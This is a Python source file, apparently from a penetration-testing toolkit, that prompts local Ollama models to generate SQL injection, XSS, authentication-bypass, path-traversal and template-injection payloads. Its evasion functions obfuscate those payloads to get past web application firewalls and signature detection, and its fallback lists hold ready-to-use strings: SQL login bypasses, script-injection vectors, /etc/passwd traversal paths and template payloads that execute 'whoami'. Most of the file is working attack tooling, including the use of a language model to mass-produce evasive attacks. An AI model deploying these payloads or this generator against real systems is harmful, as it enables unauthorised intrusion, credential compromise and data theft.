"""
AI-Powered Payload Generator
Uses Ollama models to generate context-aware, polymorphic payloads with WAF evasion
"""

import yaml
import random
import re
from typing import Dict, List, Optional, Any
from modules.ollama_integration import OllamaClient
import base64
import urllib.parse
import html


class PayloadGenerator:
    """Generate intelligent, context-aware security payloads using AI"""

    def __init__(self, config_path: str = "config.yaml"):
        # Load configuration
        with open(config_path, "r") as f:
            self.config = yaml.safe_load(f)

        # Initialize Ollama client
        ollama_config = self.config["ollama"]
        self.client = OllamaClient(
            base_url=ollama_config["base_url"], model=ollama_config["models"]["payload"]
        )

        self.payload_config = self.config["payloads"]
        self.evasion_config = self.config["evasion"]

        # Payload learning database (successful payloads)
        self.learned_payloads = {
            "sql": [],
            "xss": [],
            "path_traversal": [],
            "command_injection": [],
            "ssti": [],
        }

    def generate_sql_injection_payloads(
        self, context: Dict[str, Any], count: int = 10
    ) -> List[str]:
        """Generate SQL injection payloads tailored to context"""
        print(f"[+] Generating {count} SQL injection payloads...")

        # Extract context information
        database_type = context.get("database_type", "unknown")
        error_message = context.get("error_message", "")
        parameter_name = context.get("parameter", "id")
        waf_detected = context.get("waf_detected", False)

        prompt = f"""Generate {count} advanced SQL injection payloads for penetration testing.

CONTEXT:
- Database Type: {database_type}
- Parameter: {parameter_name}
- Error Message: {error_message}
- WAF Detected: {waf_detected}

REQUIREMENTS:
1. Generate diverse payload types (union, boolean, time-based, error-based)
2. Include WAF bypass techniques if WAF detected
3. Use database-specific syntax when database type is known
4. Each payload should be on a new line
5. No explanations, just payloads

TECHNIQUES TO USE:
- Comment-based bypasses: /**/, --, #
- Encoding: hex, URL encoding, double encoding
- Case variation: UniOn, SeLeCt
- Whitespace tricks: tabs, newlines, comments
- Inline comments: /*!50000SELECT*/

Generate {count} payloads now:"""

        response = self.client.generate(
            prompt=prompt, temperature=self.config["ollama"]["temperature"]["payload"]
        )

        if not response:
            return self._fallback_sql_payloads(count)

        # Extract payloads from response
        payloads = [
            line.strip()
            for line in response.split("\n")
            if line.strip() and not line.startswith("#")
        ]

        # Apply additional evasion if enabled
        if self.evasion_config["enabled"] and waf_detected:
            payloads = [self._apply_evasion(p, "sql") for p in payloads]

        # Store successful patterns for learning
        if self.payload_config["ai_generated"]["learning_enabled"]:
            self.learned_payloads["sql"].extend(payloads[:3])

        return payloads[:count]

    def generate_xss_payloads(
        self, context: Dict[str, Any], count: int = 10
    ) -> List[str]:
        """Generate XSS payloads based on injection context"""
        print(f"[+] Generating {count} XSS payloads...")

        injection_context = context.get(
            "context", "html"
        )  # html, attribute, script, css
        filtered_chars = context.get("filtered_chars", [])
        waf_detected = context.get("waf_detected", False)

        prompt = f"""Generate {count} advanced Cross-Site Scripting (XSS) payloads for security testing.

CONTEXT:
- Injection Context: {injection_context}
- Filtered Characters: {', '.join(filtered_chars) if filtered_chars else 'None detected'}
- WAF Detected: {waf_detected}

REQUIREMENTS:
1. Generate payloads suitable for {injection_context} context
2. Avoid filtered characters if possible
3. Include modern bypass techniques
4. Each payload on separate line
5. No explanations

TECHNIQUES:
- Event handlers: onerror, onload, onfocus, etc.
- HTML5 tags: <svg>, <video>, <audio>
- Encoding: HTML entities, Unicode, hex
- DOM-based: location.hash, document.write
- Filter bypasses: case variation, fragmentation

Generate {count} creative XSS payloads:"""

        response = self.client.generate(
            prompt=prompt, temperature=self.config["ollama"]["temperature"]["payload"]
        )

        if not response:
            return self._fallback_xss_payloads(count)

        payloads = [
            line.strip()
            for line in response.split("\n")
            if line.strip() and "<" in line
        ]

        # Apply context-specific encoding
        payloads = [self._encode_for_context(p, injection_context) for p in payloads]

        # Apply evasion if WAF detected
        if self.evasion_config["enabled"] and waf_detected:
            payloads = [self._apply_evasion(p, "xss") for p in payloads]

        return payloads[:count]

    def generate_auth_bypass_payloads(
        self, auth_type: str, context: Dict[str, Any], count: int = 10
    ) -> List[Dict[str, str]]:
        """Generate authentication bypass payloads"""
        print(f"[+] Generating {count} {auth_type} bypass payloads...")

        prompt = f"""Generate {count} authentication bypass payloads for {auth_type} authentication.

AUTH TYPE: {auth_type}
CONTEXT: {context}

Generate payloads in this format:
username: payload1
password: payload2

INCLUDE:
- SQL injection bypasses
- NoSQL injection bypasses
- LDAP injection bypasses
- Logic flaw exploits
- Default credentials

Generate {count} username/password pairs:"""

        response = self.client.generate(prompt=prompt, temperature=0.7)

        if not response:
            return self._fallback_auth_payloads(count)

        # Parse username/password pairs
        payloads = []
        lines = response.split("\n")

        for i in range(0, len(lines) - 1, 2):
            if "username:" in lines[i].lower() and "password:" in lines[i + 1].lower():
                username = lines[i].split(":", 1)[1].strip()
                password = lines[i + 1].split(":", 1)[1].strip()
                payloads.append({"username": username, "password": password})

        return payloads[:count]

    def generate_path_traversal_payloads(
        self, os_type: str, context: Dict[str, Any], count: int = 10
    ) -> List[str]:
        """Generate path traversal payloads for specific OS"""
        print(f"[+] Generating {count} path traversal payloads for {os_type}...")

        prompt = f"""Generate {count} path traversal payloads for {os_type} systems.

TARGET OS: {os_type}
CONTEXT: {context}

REQUIREMENTS:
- Include various encoding methods
- Test different depth levels (../../../)
- Include null byte injection (%00)
- URL encoding variations
- Use OS-specific paths

TARGET FILES:
- Linux: /etc/passwd, /etc/shadow, /var/log/auth.log
- Windows: C:\\windows\\win.ini, C:\\boot.ini
- Generic: ../config.php, ../../.env

Generate {count} payloads (one per line):"""

        response = self.client.generate(prompt=prompt, temperature=0.7)

        if not response:
            return self._fallback_path_traversal(os_type, count)

        payloads = [line.strip() for line in response.split("\n") if line.strip()]

        # Apply encoding variations
        encoded_payloads = []
        for payload in payloads:
            encoded_payloads.append(payload)
            if self.evasion_config["enabled"]:
                encoded_payloads.append(urllib.parse.quote(payload))
                encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))

        return encoded_payloads[:count]

    def generate_ssti_payloads(
        self, template_engine: str, context: Dict[str, Any], count: int = 10
    ) -> List[str]:
        """Generate Server-Side Template Injection payloads"""
        print(f"[+] Generating {count} SSTI payloads for {template_engine}...")

        prompt = f"""Generate {count} Server-Side Template Injection (SSTI) payloads for {template_engine}.

TEMPLATE ENGINE: {template_engine}
CONTEXT: {context}

REQUIREMENTS:
- Detect template engine if unknown
- RCE payloads
- Information disclosure payloads
- File read payloads

ENGINES TO COVER:
- Jinja2: {{{{7*7}}}}
- Twig: {{{{7*7}}}}
- Freemarker: ${{7*7}}
- Velocity: #set($x=7*7)$x
- ERB: <%=7*7%>

Generate {count} payloads:"""

        response = self.client.generate(prompt=prompt, temperature=0.7)

        if not response:
            return self._fallback_ssti_payloads(count)

        payloads = [
            line.strip()
            for line in response.split("\n")
            if line.strip() and any(c in line for c in ["{{", "}}", "<%", "%>", "${"])
        ]

        return payloads[:count]

    def generate_polymorphic_variants(
        self, original_payload: str, payload_type: str, count: int = 5
    ) -> List[str]:
        """Generate polymorphic variants of a successful payload"""
        print(f"[+] Generating {count} polymorphic variants...")

        prompt = f"""Generate {count} variations of this {payload_type} payload that maintain the same functionality but bypass signature detection:

ORIGINAL PAYLOAD:
{original_payload}

REQUIREMENTS:
1. Maintain exploitation capability
2. Change syntax/structure to evade signatures
3. Use different encoding methods
4. Apply obfuscation techniques
5. Each variant must work independently

Generate {count} variants:"""

        response = self.client.generate(prompt=prompt, temperature=0.8)

        if not response:
            return [original_payload]

        variants = [line.strip() for line in response.split("\n") if line.strip()]

        return variants[:count]

    def _apply_evasion(self, payload: str, payload_type: str) -> str:
        """Apply WAF evasion techniques to payload"""
        techniques = self.evasion_config["techniques"]

        # Randomly apply 1-3 techniques
        num_techniques = random.randint(1, min(3, len(techniques)))
        selected_techniques = random.sample(techniques, num_techniques)

        evaded_payload = payload

        for technique in selected_techniques:
            if technique == "encoding":
                evaded_payload = self._apply_encoding(evaded_payload)
            elif technique == "case_variation":
                evaded_payload = self._apply_case_variation(evaded_payload)
            elif technique == "comment_injection":
                evaded_payload = self._inject_comments(evaded_payload, payload_type)
            elif technique == "whitespace_manipulation":
                evaded_payload = self._manipulate_whitespace(evaded_payload)
            elif technique == "unicode_bypass":
                evaded_payload = self._unicode_encode(evaded_payload)

        return evaded_payload

    def _apply_encoding(self, payload: str) -> str:
        """Apply URL encoding"""
        # Encode special characters
        encoded = ""
        for char in payload:
            if char in ["<", ">", '"', "'", "(", ")", ";", "="]:
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        return encoded

    def _apply_case_variation(self, payload: str) -> str:
        """Randomly vary case of SQL/XSS keywords"""
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "SCRIPT", "ALERT", "ONERROR"]

        for keyword in keywords:
            if keyword in payload.upper():
                # Randomize case
                varied = "".join(random.choice([c.upper(), c.lower()]) for c in keyword)
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                payload = pattern.sub(varied, payload, count=1)

        return payload

    def _inject_comments(self, payload: str, payload_type: str) -> str:
        """Inject comments to break signatures"""
        if payload_type == "sql":
            # SQL comments
            return payload.replace(" ", "/**/").replace("SELECT", "SEL/**/ECT")
        elif payload_type == "xss":
            # HTML comments
            return payload.replace("<script>", "<script<!-->")
        return payload

    def _manipulate_whitespace(self, payload: str) -> str:
        """Replace spaces with tabs, newlines, or multiple spaces"""
        replacements = ["\t", "\n", "  ", "   "]
        return payload.replace(" ", random.choice(replacements))

    def _unicode_encode(self, payload: str) -> str:
        """Apply Unicode encoding to bypass filters"""
        # Encode some characters as Unicode
        encoded = ""
        for char in payload:
            if random.random() < 0.3:  # 30% chance to encode
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded

    def _encode_for_context(self, payload: str, context: str) -> str:
        """Encode payload based on injection context"""
        if context == "attribute":
            return html.escape(payload, quote=True)
        elif context == "javascript":
            return payload.replace("'", "\\'").replace('"', '\\"')
        elif context == "url":
            return urllib.parse.quote(payload)
        return payload

    # Fallback methods when AI is unavailable
    def _fallback_sql_payloads(self, count: int) -> List[str]:
        """Fallback SQL payloads when AI fails"""
        base_payloads = [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin' --",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "' OR 'a'='a",
            "1' ORDER BY 1--",
            "' AND '1'='1",
            "admin' OR '1'='1'#",
            "1' UNION SELECT @@version--",
        ]
        return base_payloads[:count]

    def _fallback_xss_payloads(self, count: int) -> List[str]:
        """Fallback XSS payloads"""
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ]
        return base_payloads[:count]

    def _fallback_auth_payloads(self, count: int) -> List[Dict[str, str]]:
        """Fallback authentication bypass payloads"""
        base_payloads = [
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "admin' --", "password": ""},
            {"username": "admin", "password": "admin"},
            {"username": "administrator", "password": "administrator"},
            {"username": "' OR 1=1--", "password": "' OR 1=1--"},
        ]
        return base_payloads[:count]

    def _fallback_path_traversal(self, os_type: str, count: int) -> List[str]:
        """Fallback path traversal payloads"""
        if os_type.lower() == "windows":
            base_payloads = [
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//windows//win.ini",
                "..%2F..%2F..%2Fwindows%2Fwin.ini",
            ]
        else:
            base_payloads = [
                "../../../etc/passwd",
                "....//....//....//etc//passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "/etc/passwd",
                "../../../../../../etc/passwd",
            ]
        return base_payloads[:count]

    def _fallback_ssti_payloads(self, count: int) -> List[str]:
        """Fallback SSTI payloads"""
        base_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "<%= system('whoami') %>",
        ]
        return base_payloads[:count]


# Testing
if __name__ == "__main__":
    print("[+] Testing Payload Generator...")

    generator = PayloadGenerator()

    # Test SQL injection generation
    context = {
        "database_type": "MySQL",
        "error_message": "You have an error in your SQL syntax",
        "parameter": "id",
        "waf_detected": True,
    }

    sql_payloads = generator.generate_sql_injection_payloads(context, count=5)
    print(f"\n[+] Generated {len(sql_payloads)} SQL injection payloads:")
    for payload in sql_payloads[:3]:
        print(f"    {payload}")

    # Test XSS generation
    xss_context = {
        "context": "html",
        "filtered_chars": ["<", ">"],
        "waf_detected": False,
    }

    xss_payloads = generator.generate_xss_payloads(xss_context, count=5)
    print(f"\n[+] Generated {len(xss_payloads)} XSS payloads:")
    for payload in xss_payloads[:3]:
        print(f"    {payload}")

    print("\n[✓] Payload generator test complete!")
